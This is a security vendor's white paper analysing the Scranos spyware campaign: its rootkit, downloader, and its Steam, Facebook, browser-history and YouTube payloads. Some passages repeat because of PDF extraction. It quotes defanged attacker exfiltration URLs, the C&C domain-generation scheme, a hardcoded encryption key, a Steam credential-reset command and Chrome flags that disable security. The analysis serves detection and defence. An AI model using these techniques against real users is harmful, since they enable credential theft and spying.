    "plain_text": "# Inside Scranos – A Cross Platform, Rootkit-Enabled Spyware Operation\n\n\n-----\n\nWhite Paper\n\n###### Authors:\n\n Andrei Raul ARDELEAN - Security Researcher, Cyber Threat Intelligence Lab\n\n Claudiu Ștefan COBLIȘ - Security Researcher, Cyber Threat Intelligence Lab\n\n Cristofor OCHINCA - Security Researcher, Cyber Threat Intelligence Lab\n\n\n-----\n\nWhite Paper\n\n### Overview\n\nLast year, the Bitdefender Cyber Threat Intelligence Lab started analysis of a new password- and data-stealing operation based\naround a rootkit driver digitally signed with a possibly stolen certificate. The operation, partially described in a recent article by\nTencent, primarily targeted Chinese territory until recently, when it broke out around the world.\n\nDespite the sophistication, this attack looks like a work in progress, with many components in the early stage of development.\nAlthough the campaign has not reached the magnitude of the Zacinlo adware campaign, it is already infecting users worldwide.\n\nWe discovered that the operators of this rootkit-enabled spyware are continuously testing new components on already-infected\nusers and regularly making minor improvement to old components. The various components can serve different purposes or take\ndifferent approaches to achieving their goals. Some of the most important components shipped with the malware can achieve the\nfollowing:\n\n- Extract cookies and steal login credentials from Google Chrome, Chromium, Mozilla Firefox, Opera, Microsoft Edge, Internet\n**Explorer, Baidu Browser and Yandex Browser.**\n\n- Steal a user’s payment accounts from his Facebook, Amazon and Airbnb webpages.\n\n- Send friend requests to other accounts, from the user’s Facebook account.\n\n- Send phishing messages to the victim’s Facebook friends containing malicious APKs used to infect Android users as well.\n\n- Steal login credentials for the user’s account on Steam.\n\n- Inject JavaScript adware in Internet Explorer.\n\n- Install Chrome/Opera extensions to inject JavaScript adware on these browsers as well.\n\n- Exfiltrate browsing history.\n\n- Silently display ads or muted YouTube videos to users via Chrome. We found some droppers that can install Chrome if it is not\nalready on the victim’s computer.\n\n- Subscribe users to YouTube video channels.\n\n- Download and execute any payload.\n\n\n-----\n\nWhite Paper\n\n### Infection and spreading mechanisms\n\nBitdefender research reveals this malware spreads via Trojanized applications disguised as cracked software, or applications\nposing as legitimate software such as e-book readers, video players, drivers or even antimalware products. When executed, a rootkit\ndriver is installed to cloak the malware and ensure persistence. The malware then phones home and is told what other components\nto download and install.\n\nOur telemetry shows the adware has a global presence, but it seems more prevalent in India, Romania, Brazil, France, Italy and\nIndonesia. All identified samples confirm that this operation is in a consolidation stage: the oldest samples identified date back\nto November 2018, with a massive spike in December and January. However, in March 2019, the command and control servers\nstarted pushing other strains of malware – a clear indicator that the network is now affiliated with third parties in pay-per install\nschemes.\n\n#### Infection distribution by OS\n\n**OS** **Counts**\n\n###### Windows 10 2799 Windows 7 1150 Windows 8 207 Windows 8.1 322 Windows XP 5 Windows Vista 5\n\n#### Sample distribution over time\n\n###### 250\n\n 200\n\n\n###### 150\n\n 100\n\n 50\n\n 0\n\n\n**Samples**\n\n###### Nov-18 1\n\n\n###### Dec-18\n\n Jan-19\n\n Feb-19\n\n\n###### 157\n\n 204\n\n 3\n\n\n-----\n\nWhite Paper\n\nIn addition to installing malicious components, Scranos attempts to interact with websites on the victim’s behalf. Bitdefender\nresearchers discovered the malware aggressively promotes four YouTube videos on different channels. They are listed below, with\nthe inferred time intervals of use by the adware campaign:\n\n**YouTube Page** **Started** **Ended**\n\n_https://www.youtube[.]com/watch?v=nF072khSD58_ 28.02.2019 active\n\n_https://www.youtube[.]com/watch?v=q8IqPPEMeP8_ 22.02.2019 27.02.2019\n\n_https://www.youtube[.]com/watch?v=d7TnzoQjoTw_ 21.02.2019\n\n_https://www.youtube[.]com/watch?v=peJ2vpMiU-s_ 02.01.2019\n\nOne of those channels, created on 19 February 2019, received more than 3,100 new subscribers in a single day.\n\nA look at the comments section below the video reveals that the malware effectively subscribes users without their knowledge:\n\n\n-----\n\nWhite Paper\n\n## Section 1 - Anatomy of the attack\n\n### Dropper and Rootkit components\n\nThe original avenue of infection is usually a piece of cracked software or Trojanized application posing as a legitimate utility\nbundled with the initial dropper. The dropper, which doubles as a password stealer, installs a driver that provides persistence to\nall other components to be installed in the future. As this paper was written, the digital signature of the driver, issued to Yun Yu\n**Health Management Consulting (Shanghai) Co., Ltd, had not been revoked on grounds of obvious fraudulent activity. Bitdefender**\ninformed the issuing Certificate Authority that the digital certificate was either compromised or misused.\n\nThe rootkit uses an effective persistence mechanism of rewriting itself at shutdown but does not hide itself. Subsequently, it is not\nprotected against deletion if detected. Besides the driver itself, no other components can be found on disk, as they are deleted after\nrunning. They can be downloaded again if needed. The rootkit injects a downloader into a legitimate process, which then downloads\none or more payloads. Below is an illustration of how the dropper and rootkit operate:\n\nstartup\n\n\n###### Dropper\n\namazon.dll\n\nfacebook.dll\n\n\nRootkit Service\n\nRegistry\n\n\n###### Payload 1\n\n\n###### Rootkit\n\n\nShutDown\nCallback\n\n\nC&C\n\n\nsvchost.exe\nprocess\n\nDownloader\n\n\n###### Payload N\n\n\n6. Download Payloads\n\n\nRootkit File\n\nDisk\n\n\n**1.** The dropper steals cookies, login credentials and payment info with the help of specialized DLLs. It supports the most common\n\nbrowsers and targets Facebook, YouTube, Amazon and Airbnb. Data gathered is sent back to the C&C.\n\n**2.** The dropper installs the rootkit.\n\n**3.** The rootkit registers a Shutdown callback to achieve persistence. At shutdown, the driver is written to disk and a start-up\n\nservice key is created in the Registry.\n\n**4.** The rootkit injects a downloader into a svchost.exe process.\n\n**5.** The downloader sends some info about the system to the C&C and receives download links.\n\n**6.** Further payloads are downloaded and executed.\n\n\nSteal cookies, login\nand payment info\n\n\n-----\n\nWhite Paper\n\n### YouTube subscriber payload\n\nOne of the payload files is an adware file that manipulates YouTube pages. To achieve this, it uses Chrome in debugging mode.\nSome droppers even install Chrome if the user doesn’t have it. The payload hides the Chrome window on the desktop and taskbar\nbut its process is still visible in Task Manager/Process Explorer. After receiving a YouTube page from the C&C, the URL is opened in\nChrome and the payload instructs Chrome to take various actions in the page: start a video, mute a video, subscribe to a channel,\n**click ads. These operations are performed through debug commands.**\n\nA diagram for this payload type:\n\n###### 2. Start Chrome in Debug Mode\n\nHideCreateProcess.dll\n\n###### 3. Inject\n\n#### Y2B payload\n\nMoveWindow.dll\n\n###### 5.Debug Chrome, Chrome.exe Perform Actions in Page\n\nspawn spawn\n\n###### 1. Get YouTube Page\n Chrome.exe Chrome.exe\n\n##### C&C\n\nvisit youtube page\n###### 4.Visit YouTube Page\n\n**1.** The payload sends the C&C data that identifies the system and receives a JSON containing a YouTube link.\n\n**2.** Using an embedded DLL, it opens the Chrome browser in debugging mode to the YouTube link.\n\n**3.** The embedded DLL injects another small DLL in Chrome that hides the Chrome window.\n\n**4.** Chrome opens the YouTube page.\n\n**5.** The payload debugs Chrome using the Chrome DevTools Protocol. At this stage, it takes various actions on the page: subscribe,\n\nclick ads, starts the video.\n\n### Extension Installer Payload\n\nThis type of payload installs adware extensions in Chrome. These extensions are meant to further inject adware scripts in web\npages. Internet Explorer is also targeted, and the adware scripts are injected into it using other methods. As seen in the picture\nbelow, the script link highlighted in red, as well as its content in blue, were inserted into a web page in the Chrome browser using a\nmalicious extension.\n\n\nMoveWindow.dll\n\n###### Chrome.exe\n\n\n###### Chrome.exe\n\n\n-----\n\nWhite Paper\n\nThe following diagram explains this functionality:\n\nrundll32.exe Internet Explorer\n\n###### 1.Inject 3.Inject\n WCRX payload wsearch_ie.dll javascript\n\n 4.Install Extension\n\n 2.Get Script\n\nextension\n\nChrome\n\n###### Disk C&C\n\n**1.** The Extension Installer Payload (wcrx.exe) injects the DLL that interferes with Internet Explorer into rundll32.exe process.\n\n**2.** The injected DLL gets JavaScript code from the C&C.\n\n**3.** The JavaScript is injected into Internet Explorer windows using a COM Object.\n\n\nrundll32.exe\n\nwsearch_ie.dll\n\n\n###### WCRX payload\n\n\n-----\n\nWhite Paper\n\n**4.** The payload installs the adware extension in Chromium-based browsers.\n\n### Facebook Spammer Payload\n\n###### The purpose of this payload is to send Facebook friend requests to other users. It also sends messag­ es to the user’s Facebook friends with links to suspicious Android APKs. It does so by stealing cookies from browsers, collecting tokens from the user’s profile page and sending crafted requests to Facebook. This can be used to increase the influence of selected accounts or in a scheme where attackers sell fake Facebook followers.\n\n The process is as follows:\n\n\n##### Facebook Spammer Payload\n\nfacebook.dll\n\nEdgeCookiesView.exe\n\n\n###### 2. Get users and spam links\n\n\nChrome\n\ncookies\n\nEdge\n\ncookies\n\n##### Disk\n\n\n##### C&C\n\n\n##### Facebook\n\n\n**1.** The payload collects Facebook cookies from installed browsers using an embedded DLL. It uses an external program, Nirsoft’s\n\nEdgeCookiesView, to collect cookies from Microsoft Edge.\n\n**2.** The payload receives a list of Facebook users and links to malicious APKs from the command and control center.\n\n**3.** Using the collected cookies and other tokens, the payload then sends friend requests to the Facebook user list received by the\n\nC&C and then spams messages containing the APK links to them.\n\n### Steam Data Stealer Payload\n\nThe main purpose of this type of payload is to steal user credentials from the Steam gaming platform. First, it forces Steam to ask\nfor the credentials again. Then it injects a DLL in the Steam executable that finds the username and password as they are entered.\nAt the same time, it gathers a list of installed games and the time they have been played. The 64bit components of this payload are\nalso there, but they serve no purpose yet, which suggests the stealer is still under development.\n\nA schematic diagram describes the process:\n\n\n-----\n\nWhite Paper\n\nrundll32.exe steam.exe\n\n###### 2.Inject 3.Inject\n Steam payload SteamInject.dll SteamStealer.dll\n\n 1.Reset Login Data\n\n 4.Send Credentials\n\n Disk, Steam C&C Registry\n\n1. The payload forces Steam to ask for credentials at next logon by modifying files and Registry values.\n\n2. The payload creates a rundll32.exe process and injects a DLL in it.\n\n3. The DLL in rundll32.exe will search for steam.exe process and inject the password stealer DLL in it.\n\n4. The password stealer DLL steals the user’s credentials and sends them to the C&C along with other info about the games\ninstalled.\n\n### Browsing History Stealer Payload\n\n###### This payload collects Chrome’s browsing history and sends it to the C&C in an encrypted form. This is sim­ ilar to the other identified payloads: the executable is obfuscated in the same way, the data to be sent is encrypted with AES using the same key, the same C&C is used, and it also uses the rootkit to delete itself. This is a simpler payload and could be further evidence that this is a work in progress.\n\n##### History stealer payload Chrome\n\n###### 1.Collect\n\nhistoryer.dll History\n\n##### Disk\n\n###### 2.Exfiltrate\n\n##### C&C\n\n**1.** The payload reads Chrome’s browsing history.\n\n**2.** The history is encrypted and sent to the C&C.\n\n\nChrome\n\nHistory\n\n##### Disk\n\n\n##### History stealer payload\n\nhistoryer.dll\n\n\nsteam.exe\n\nSteamStealer.dll\n\n\n-----\n\nWhite Paper\n\n## Section 2 – A closer look at the dropper\n\nThe dropper is the component that starts this infection chain. It is masked as legitimate software or software cracks – we found\nsamples posing as e-book readers, video players, antimalware products and driver software.\n\nIts data and payloads are encrypted. It decrypts to a loader stub which, in turn, decrypts a DLL loaded with help from the stub in\nthe address space of the process. An exported function named WorkIn in this DLL is called. This function represents the actual\nfunctionality of the executable. This decryption pattern, as well as the dynamic loading of a DLL with an exported function named\n**_WorkIn that represents the actual payload, is prevalent in multiple executables linked to this campaign._**\n\nIf prior infection markers are found, the malware deletes itself. Otherwise, it sets the infection markers and acts as described below.\n\nThe signed rootkit driver is dropped in %WINDIR%\\System32 and loaded with the SCManager interface. Its filename is generated\nfrom the first 12 characters of the MD5 hash of the current user’s SID string.\n\nIt steals browser cookies and login credentials from the current user’s default browser. It can extract cookies and login credentials\nfrom Google Chrome, Chromium, Mozilla Firefox, Opera, Microsoft Edge, Internet Explorer, Baidu Browser and the Yandex\n**Browser. It can steal cookies and login information from the user’s accounts on Facebook, YouTube, Amazon and Airbnb.**\n\nFurthermore, if the user is logged into a Facebook account, it impersonates the user and extracts data from the account by visiting\ncertain web pages from the user’s computer, to avoid arousing suspicion by triggering an unknown device alert. It can extract the\nnumber of friends, and whether the user administrates any pages or has payment information in the account. It also tries using the\nFacebook account to steal Instagram log-in cookies and the number of followers the user has on Instagram.\n\nFor example, to get the number of friends of the user, it visits:\n\n**_https://www.facebook[.]com/profile.php?sk=about&id={user_id}_**\n\nwith the stolen cookies, and searches for the string <span class=”_gs6”> which describes the number of friends in the HTML page.\n\nIn a similar manner, it tries extracting information from Amazon or Airbnb if an Amazon or Airbnb account is logged in on the\ninfected computer.\n\nAs a last step, it disables Windows Defender Real-Time Protection and deletes itself with the help of the installed driver, while\nleaving the driver on the system.\n\nWe found multiple versions of this dropper; some versions also downloaded and installed an official version of Google Chrome if it\nwasn’t already installed on the machine. The installation is hidden from the user by starting it in a new hidden desktop with name\n**_Vitural_desktop_shell._**\n\nSome versions only extract data for one of the mentioned sites, while others extract cookies and login information for all sites, but\nalso attempt to extract more information (payment data, friends list etc.) for one of the mentioned domains only.\n\nSome of the requests made by the dropper can be seen below:\n\nRequest to http://178.162.132[.]79/1.php trying to steal cookies and login information:\n\n\n-----\n\nWhite Paper\n\nRequest to a12[.]fun/json/json.php trying to steal Amazon data:\n\n### Facebook DLL\n\nThis DLL is contained in some versions of the main dropper and used to extract information about the user’s Facebook account. In\nsome versions, this DLL is missing and its functionality is implemented in the main dropper. In others, it is missing entirely. It is the\nonly component written in Visual Basic. It can extract the following information:\n\n- Payment accounts (it has 2 methods to check whether the victim has a payment account added to its Facebook account)\n\n- Victim’s number of friends\n\n- Whether the user is an administrator on a page\n\n\n-----\n\nWhite Paper\n\n### Amazon DLL\n\nThis DLL is contained in some versions of the main dropper and used to extract information from the user’s Amazon account. We\nfound a version of this DLL that can also extract information from logged-in Airbnb accounts.\n\n\n-----\n\nWhite Paper\n\n## Section 3 – The rootkit component\n\nThis is the driver the dropper installs on the system. At the time of writing, it contains a valid digital signature with a certificate\nissued to 韵羽健康管理咨询（上海）有限公司, which translates as Yun Yu Health Management Consulting (Shanghai) Co., Ltd..\nThe most likely scenario is that an impersonator obtained this certificate fraudulently, even if the company is not a software vendor.\nThe choice of company helps the attackers conceal the existence of a digital certificate issued in the original company’s name.\n\nThe rootkit sets up and creates a device with named \\Device\\VideoDriver. It serves three main purposes:\n\n1) Decrypts and injects the downloader in a svchost.exe process with system authority.\n\n2) It can delete a specified file using low-level file system operations. This can be used to delete files on which the high-level\n\nWindows API would fail because the files are currently in use. For this, it registers a DEVICE_CONTROL function that responds to\ncontrol code 0x83050004 and receives a WCHAR string as parameter. We observed this control code being passed to the driver\nfrom other modules as a self-delete feature, while still loaded in memory.\n\n3) Registers an IRP_MJ_SHUTDOWN function which is used to ensure the persistence of this rootkit in the infected system by\n\nrewriting itself on disk and in registry at every shutdown, in case it was deleted.\n\nTo protect itself, it opens its image file with IoCreateFile and keeps the handle open while the driver is loaded. This makes it impossible\nto delete the file because a handle is kept open in System. To remove this rootkit, it must first be unloaded.\n\nIf the registry value BugSignature exists in HKLM\\Software\\Microsoft, it will neither fulfil its purposes, nor protect itself.\n\n\n-----\n\nWhite Paper\n\n## Section 4 – The downloader\n\nThis module is stored encrypted inside the rootkit driver. It is decrypted and injected in a svchost.exe process. It is used to download\nand execute files from the command and control server.\n\nWhen loaded, it contacts a different C&C depending on the time. Every two weeks, the C&C changes. The address is MD5(SHA1(string\nbased on current date)). The string represents a concatenation between the current date in the yyyymmdd format and the string\n“can’t load the buf1” where yyyy represents the current year, mm represents the space-padded month (months with a single digit will\nhave a space instead of a 0 as the first character), dd can have two values ‘01’ if the current day is on or before the 15[th] of the month,\nor ‘15’ if after. For example, for the 20[th] of February 2019, the resulted string would be “2019 215can’t load the buf1”.\n\nFor example, the request: **_http://B453A3C474BE9C1BB54E927E99CA7CFA[.]online/sta.php?g=5FC52BDCCF1D0BFA8D1C94B_**\n**_EBEE1215C460AD370409C81F16B&o=6&b=IE&v=2.0&l=p001&i=all&s=01DBE7DC97BD79C1FA0D60CF9D34D9F2_**\nis composed of:\n\n**•** **g= a computer id generated from the SID of the current user and the system volume serial number**\n\n**•** **o= major version of operating system**\n\n**•** **b= default browser on the system**\n\n**•** **v= trojan version (found samples with “1.0”,”2.0” and “3.0”)**\n\n**•** **l= value “msver1” from “HKLM\\Software\\Microsoft”, or “all” if no such value exists**\n\n**•** **i= value “msver2” from “HKLM\\Software\\Microsoft”, or “all” if no such value exists**\n\n**•** **s= redundancy hash of computer id (g parameter) + major version of OS (o parameter) + “xyz”**\n\nThe C&C responds with a list of files to download and execute:\n\n**_http://link1/file1.dat---0|http://link1/file2.dat---1|_**\n\nIn our case, the response was:\n\n**_http://dl.ossdown[.]fun/y2b.dat---0|http://dl.ossdown[.]fun/wcrx.dat---0|_**\n\nThe files are then downloaded and decompressed to %TEMP%, then executed. The original file is compressed to the 7z format.\n\nIf “0” is specified, the MD5 hash of the download link is computed and checked for the existence of a value with the same name as\nthis MD5 in HKLM\\Software\\Microsoft. If such a value exists, the file is not downloaded. Otherwise. it is downloaded and the MD5 of\nits download link is added as a value of the above-mentioned key to avoid future downloads of the same file.\n\nIf “1” is specified, there is no check for a value in registry, it is downloaded as long as another file with the same name does not exist\nin the %TEMP% folder.\n\n\n-----\n\nWhite Paper\n\n## Section 5 – The extension installer payload\n\nThis corresponds to the file wcrx.exe, named after its export name and PDB file. It is packed with the same packer characteristic to\nthis malware, which decrypts, loads and calls the WorkIn function from a DLL contained in the original executable. Its main task is\nto find ways of injecting JavaScript in the user’s browsers. When called by its loader, it:\n\n- adds a browser extension called chrome_filter to Chrome or Opera if they are installed on the machine\n\n- makes a request to download http://fffffk[.]xyz/down/m_inc.js?{timestamp in milliseconds} and replaces the m_inc.js file from\nthe browser extension (this is the content script of the extension, which runs for every visited page)\n\n- starts %SYSTEMROOT%\\system32\\rundll32.exe and injects another DLL in it (wsearch_ie.dll) which further looks for opportunities\nof injecting JavaScript in Internet Explorer processes\n\n- In the end, it deletes itself with help from the rootkit driver\n\n### wsearch_ie.dll\n\nThis DLL is injected in rundll32.exe by the Extension Installer payload (wcrx.exe). When loaded, it queries http://info.d3pk[.]com/\n**_js_json_** for a list of JSONs, which contain the scripts to inject into Internet Explorer and states on which pages.\n\n_http://info.d3pk[.]com/js_json_\n\n\n-----\n\nWhite Paper\n\nThe JS scripts will be injected in Internet Explorer on pages that contain domain by searching for windows with class name IEFrame,\nand injecting into windows with class name **_Internet Explorer_Server by getting their HTML object and using the COM interface_**\nfunction IHTMLWindow2.execScript().\n\n## Section 6 - Chrome Extensions\n\nOur research revealed some Extension Installer Payloads that install different browser extensions:\n\n### Chrome Filter – version 1.0.0\n\nIts metadata information seems to be copied from the MEGA v3.44.4 Chrome extension.\n\nIt runs m_inc.js for every loaded page. The purpose of this JavaScript file is to inject an adware script at the end of the body element\nof the loaded html page //s3.amazonaws[.]com/jscriptcdn/1f546f49ebf4153c8a.js.\n\nTo hide the installed extension from the user, when the local extension page chrome://extensions is being visited, it redirects to the\nChrome Web Store at https://chrome.google.com/webstore/category/extension\n\nWhen users click on the extension, an alert will be generated with chrome_filter as the title and a message that contains url-- and the\nURL of the current selected tab and an empty extension pop-up will be displayed (e.g.: url--https://google.com).\n\n\n-----\n\nWhite Paper\n\n### Fierce-tips – version 1.0.2\n\nWhen it is installed, this extension creates a new entry in context menu called **_USE Fierce Search: where users can search any_**\ncontent using this website.\n\nIf users click on the **_Fierce extension from its popup, it should create a new tab that will automatically load_** **_http://15s0[.]com._**\nUnfortunately, on Chrome v52 and Chrome v72, it didn’t seem to work the way it was supposed to. Over time, this website has\nundergone massive repurposing, from a simple webpage to a porn website to search engine and now to a blog powered by\nWordPress.\n\n\n-----\n\nWhite Paper\n\n### PDF Maker - version 1.0.7\n\nThis extension still exists on the Google Webstore, and is currently in use by nearly 149,000 users. When installed, it changes the\ndefault search engine to http://feed.pdf-mafker[.].com/?q= without the user’s consent. On the Google Webstore, though, it says that\nthe default search engine will be changed. When users visit the extension’s homepage pdf-maker[.]com, the extension adds a new\ndiv element with id extInstalled to the body element of the loaded page.\n\n\n-----\n\nWhite Paper\n\n## Section 7 – The Facebook Spammer Payload\n\nThis is another payload downloaded by the injected downloader. It is responsible for sending friend requests to other users, as well\nas sending phishing messages to friends of the victim. The payload is similar to the others, as it features the same obfuscation, and\nsimilar embedded DLLs and executables to achieve its purpose. It also uses the MSScriptControl.ScriptControl COM interface with\nthe same JavaScript file to parse JSONs as the YouTube subscriber payload described below.\n\nThe payload loads a version of facebook.dll (described earlier) that extracts Facebook cookies from Chrome (and Chromium-based\nbrowsers) and Firefox. It also embeds Nirsoft’s EdgeCookiesView to extract cookies from the Edge browser. EdgeCookiesView is\nused silently without user interaction. Using these tools, it searches the Facebook user ID (c_user cookie).\n\nFor other Facebook requests to work, it requires several tokens besides the user ID **_c_user_** inside cookies. It makes a request\nto the user’s homepage: https://www.facebook[.]com/profile.php?id=<c_user> and searches for the tokens fb_dtsg (token used to\nprevent CSRF attacks) and asyng_get_token (called fb_dtsg_ag by malware) in the raw html page. These tokens are mandatory to\nsuccessfully use the API.\n\n##### Friend Requests\n\nThe payload visits http://www.hh1m[.]com/fb/friend/index.php and receives a list of user IDs to send friend requests to. However, at\nthe time of analysis, the C&C returned an empty list (‘[]’). A friend request is sent to all users in the list by sending carefully crafted\nrequests to the Facebook webpage, as seen in the piece of code below:\n\n### Spam Friends\n\nThe payload visits http://www.hh1m[.]com/fb/apk/index.php and expects a JSON list with links to files. It will use the first element of\nthe list to send messages to friends. In our case, it returned:\n\n###### [\n\n    {\n\n “name”: “heyvideo”,\n\n “url”: “http://dl.ossdown[.]fun/hey/heyvideo.apk”,\n\n “chat”: “Exquisite+life%2c+click+to+get+a+surprise.”\n\n    }\n\n ]\n\n\nFor other Facebook requests to work, it requires several tokens besides the user ID **_c_user_** inside cookies. It makes a request\nto the user’s homepage: https://www.facebook[.]com/profile.php?id=<c_user> and searches for the tokens fb_dtsg (token used to\nprevent CSRF attacks) and asyng_get_token (called fb_dtsg_ag by malware) in the raw html page. These tokens are mandatory to\nsuccessfully use the API.\n\n##### Friend Requests\n\nThe payload visits http://www.hh1m[.]com/fb/friend/index.php and receives a list of user IDs to send friend requests to. However, at\nthe time of analysis, the C&C returned an empty list (‘[]’). A friend request is sent to all users in the list by sending carefully crafted\nrequests to the Facebook webpage, as seen in the piece of code below:\n\n\n-----\n\nWhite Paper\n\nTo get a list of the user’s friends as a JSON, it sends a request to https://www.facebook[.]com :\n\nIt then sends to every friend of the user a message with the chat parameter from the JSON received from the C&C, and an attachment\nfrom the link in the url parameter. The name of the file will be the name parameter concatenated with .apk (ex: heyvideo.apk). In\nour case, the file is an Android application, so this campaign is clearly designed to deceive the victim’s friends into installing the\nmalicious APK to extend the infection to smartphones as well.\n\nThe spammer component uploads the user’s Facebook ID and the number of friends that have already been sent the APK link by\nvisiting: http://www.hh1m[.]com/fb/apk/count.php?c_user=<victim_fbid>&num=<num_friends>.\n\nIn the end, the payload deletes itself using a dropped Visual Basic Script file.\n\n### Android Adware App\n\nThis application, called Accurate scanning of QR code, is a repackaged version of an app from Google Play Store. The app displays\naggressive adware behaviour and interferes with the use of other legitimate applications. We first spotted this app on March 12,\n2019 in Japan.\n\nIts package name is **_com.tqyapp.qr and the certificate fingerprint is_** **2ccf95ad1daefd7a96e384f3f0fb9fdae9e8e39c. We found**\nother apps signed with the same certificate:\n\n**App SHA1** **Package Name**\n\ncom.tqyapp.qr\nacfebc3b8c0acd0be95d0c58d25236e4b167d123\n\ncom.tqyapp.qr\na40d378f0766f20748bafb23872c3c43bb6ec27a\n\ncom.tqyapp.flashlight\nb0f36f20ced38a3137f27f6a399dbe9c4c8b4a6b\n\nThe purpose of this application is apparently to track the infected victims. The app exfiltrates the phone’s unique IMEI number by\nsending a request to its C&C, as shown in the code snippet below:\n\n\nTo get a list of the user’s friends as a JSON, it sends a request to https://www.facebook[.]com :\n\n\n-----\n\nWhite Paper\n\nThe C&C request will be:\n\n**_http://hh1m[.]com/count/app/index.php?imei=<phone_IMEI>_**\n\nThe same C&C is used by the Windows components as well, so we can assume the Android application is also part of the whole\nadware campaign and not just an ordinary adware application. Except for the IMEI exfiltration part, the application is very similar to\nanother app in the Play Store: https://play.google.com/store/apps/details?id=com.tqyapp.qr. As shown in the comments, users\nare already complaining about the adware behaviour of the original application.\n\n\n-----\n\nWhite Paper\n\n###### This application contains the following adware SDKs: Facebook ads, Google ads, Tapjoy ads, as well as the tqwallpaper ad manager. Most of the code base is identical in both apps: the adware code is left unchanged; even some IDs used by the adware SDKs are preserved. It seems that the repackaged trojanized version is generating extra revenue, intended or not.\n\n\n-----\n\nWhite Paper\n\n## Section 8 – The Steam data stealer Payload\n\nThis executable can be one of the payloads downloaded by the injected downloader. Its purpose is theft of Steam information and\ncredentials.\n\nIt is packed with the same packer characteristic to this malware, decrypting a DLL with a WorkIn function that represents the actual\npayload of the executable.\n\nIt starts by setting the value of RememberPassword in HKCU\\Software\\Valve\\Steam to zero, and deleting all ssfn files in the Steam\ndirectory with the command cmd.exe /c del /a /q {steam directory}\\ssfn*, actions taken to ensure that the user has to enter his\ncredentials when logging in to Steam. If the Steam directory is not found, the executable exits and deletes itself.\n\nIt then proceeds to create a new instance of rundll32.exe and inject a DLL in the newly created rundll32 process. The injected code\niterates through the currently running processes looking for processes with the name steam.exe and injecting another DLL in them.\n\nThe DLL injected in steam.exe is the one that controls Steam data theft and exfiltration to the attacker. It steals login credentials by\nhooking the V_strncpy function from vstdlib_s.dll, a DLL used by steam, to check whether the copy is related to the UserNameEdit\nfield or the PasswordEdit field and saving the values being copied.\n\nWhen a user is successfully logged in to Steam, the payload sends the user’s credentials, along with a list of apps the user has\ninstalled on Steam and the last time they were played (taken from the localcofig.vdf file in the steam directory), and a list of all\ngames installed on the user’s Steam account (taken from HKCU\\Software\\Valve\\Steam\\Apps), as well as a hardcoded version string\ndenoting its own version. The games are represented by application IDs used by Steam, rather than their names. The data is first\nencrypted using AES-128-ECB using the key “87c7bb6eb0234bbb” and then encoded and sent to http://info.d3pk[.]com/s.php?str=.\nA hash of the credentials is added as a value in HKCU\\SOFTWARE\\Microsoft, the username-password combination is checked with\nthose values prior to sending to the C&C in order to not send data for already sent username-password combinations.\n\nThe attacker seems to have made several mistakes when implementing the localconfig.vdf parsing and didn’t account for some\nfields showing up in the file. Therefore, unintended data may also be sent to the C&C in some cases.\n\n###### decodes to:\n```\n {\n,”-----“ :”username“  \n,”-----“ :”pass“  \n,”,}pubg”: “{914320,1” “LastPlayed” “1551265255“  \n,”token”: “1“  \n,”|games”: “914320“  \n ”ver”: “1.6.2“  \n }\n\n```\nThe bold part wasn’t expected by the attacker and is there because additional fields are present in the localconfig.vdf file.\n\nNotice that the list of installed application is tagged as pubg in the data sent to the C&C. This is a remnant of older versions (e.g.:\n_1.4) which did not send the last played time of Steam games, but rather used this tag to flag whether_ **_PUBG (PlayerUnknown’s_**\n**_Battlegrounds) was installed._**\n\nIt contains 64 bit versions of all injected DLLs in case the processes injected into are 64 bits. However, those DLLs don’t have any\nfunctionality implemented and their debug data is named as demodll.pdb, this suggests that it may still be a work in progress.\n\n\n-----\n\nWhite Paper\n\n## Section 9 - History Stealer Payload\n\nThis payload steals Chrome’s history data from disk. It contains code to parse the SQLite database that holds the history.\n\nThe stolen data is then encrypted with AES with the same key as the one in the Steam Stealer Payload, encoded in Base64 and sent\nto the C&C as:\n\n**_http://info.d3pk[.]com/history/index.php?str=<Base64EncryptedData>_**\n\n\n-----\n\nWhite Paper\n\n## Section 10 - YouTube Subscriber Payload\n\nThis is another downloaded payload, used to manipulate YouTube pages. This file is suggestively saved as **_Y2B.EXE. The file_**\ncontains other executables:\n\n32bit and 64bit versions of a driver that processes network requests through a specific DNS: **_114.114.114.114_** (see DNS driver\nsection)\n\na DLL that starts the Chrome browser and injects in it another DLL (32 bit and 64bit versions available) that hides Chrome windows\nand Task Bar buttons (see HideCreateProcess DLL and MoveWindow DLL)\n\nThe DNS driver is dropped in %TEMP% folder for the current user with a random name, from 10 uppercase letters (ex: MOIYZBWQSO.\n**_sys). The driver acts as a proxy that uses DNS 114.114.114.114_** for internet traffic. The dropper can use this feature by issuing\ncommands to the driver and receiving responses from it. The driver is dropped and used only if the payload cannot connect to the\nChrome debug server (more info below).\n\nThe payload connects to https://info.d3pk[.]com with the following request:\n\nThe payload receives a JSON containing a YouTube URL. This URL is extracted and will be used for starting Chrome browser. For\nJSON parsing the executable is using a JavaScript file through the MSScriptControl.ScriptControl COM Interface. Another Interface\n**_VBScript.RegExp is used for matching regular expressions._**\n\nChrome is started through an embedded DLL that is dynamically loaded in the process of the payload. The DLL also injects in\nChrome another DLL that hides its window. The command line for starting Chrome is:\n\n###### “C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe” --disable-images\n\n                             --remote-debugging-port=59315\n\n                             --user-data-dir=C:\\Users\\user\\AppData\\Local\\Temp\\chrome_1551069360253 \n\n                             --lang=en-us\n\n                             --disable-popup-blocking\n\n                             --ignore-certificate-errors\n\n                             --metrics-recording-only\n\n                             --disable-hang-monitor\n\n                             --disable-prompt-on-repost\n\n                             --disable-sync\n\n                             --disable-background-networking\n\n                             --disable-web-resources\n\n\nThe payload connects to https://info.d3pk[.]com with the following request:\n\n\n-----\n\nWhite Paper\n\n######                             --safebrowsing-disable-download-protection\n\n                             --disable-client-side-phishing-detection\n\n                             --disable-component-update\n\n                             --disable-default-apps\n\n                             --no-first-run\n\n                             --disable-web-security\n\n                             --test-type=webdriver\n\n                             --password-store=basic\n\n                             --use-mock-keychain\n\n                             {“url”:”https://www.youtube.com/watch?v=q8IqPPEMeP8”,”ad”:”1”,”sub”:”1”}\n\nChrome is started in debugging mode (--remote-debugging-port=59315), and the port is random generated each time the payload\nruns. From then on, the payload communicates with Chrome using the Chrome DevTools Protocol; it requests a JSON from\n**_http://127.0.0.1/json, a page set up by the Developer Tools, from where it finds the address of the WebSocket protocol server that_**\nwas created for debugging. If, for some reason, it cannot get the requested JSON, the DNS driver is installed and a request to\n**_http://127.0.0.1/json is made through the driver. Through this server, the payload controls the debugged Chrome browser by sending_**\nand receiving JSON commands and responses. The following DevTools methods are used:\n\n######       